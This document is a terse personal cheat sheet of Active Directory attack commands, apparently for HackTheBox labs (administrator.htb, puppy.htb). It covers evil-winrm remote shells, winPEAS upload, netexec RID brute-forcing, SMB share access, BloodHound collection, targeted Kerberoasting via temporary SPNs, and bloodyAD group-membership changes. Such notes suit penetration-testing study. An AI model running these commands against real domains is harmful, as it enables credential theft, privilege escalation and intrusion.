								Active Directory Hacking:


/etc/hosts
$IP DC [host-name] DC.administrator.htb administrator.htb [domain name]
---------------------------------
winPEASx64.exe

How to use: after running evul-winrm then use winpeas to check for vulnerabilities on the target system by using the command: upload winPEASx64.exe
------------------------------------------------------------------------
Evil-Winrm
How to use:
	evil-winrm -i $IP -u username -p password
	Ex. evil-winrm -i 10.0.0.0 -u username -p 'password'
--------------------------------------------------------------
using netexec:

one tool to perform multiple steps of the attack chain (very fast compared to running manual commands)
nxc $IP ftp $IP/domain-name -u username -p password
	or smb, winrm
nxc $IP ftp $IP/domain-name -u "username" -p "password" --rid-brute | grep SidTypeUser
-----------------------
nxc option $IP Example: nxc smb 10.0.0.0 
----------------------------
nxc ldap $IP -u username -p 'password' --share
-------------------------------------------------
smbclient:
	smbclient -U username@domain //$IP/share
	Ex. smbclient -U username@puppy.htb //10.0.0.0/DEV
_______________________________________________
Tool: bloodyAD

bloodhound-python -u username -p 'password' -c ALL -d $domain.htb -ns $IP

Toool: TargetedKerberoast.py | check github for installetion
	a python script that prints "Kerveroast" hashes for user accounts with SPNs set.

	if a user does not have an SPN:
		sets a temporary SPN (using write access)
		Prints the Kerberoast hash
		Deletes the SPN after grabbing the hash
------------------------------------------------------
Tool: bloodyAD

how to use: bloodyAD --host $host-name -d domain -u username -p 'password'

Example: bloodyAD --host puppy.htb -d puppy.htb -u username -p 'password' add groupMember DEVELOPERS username

use case: adding member to a particuler group
___________________________________________________________________________
use "chrony" if needed
sudo ntpdate $domain.htb 





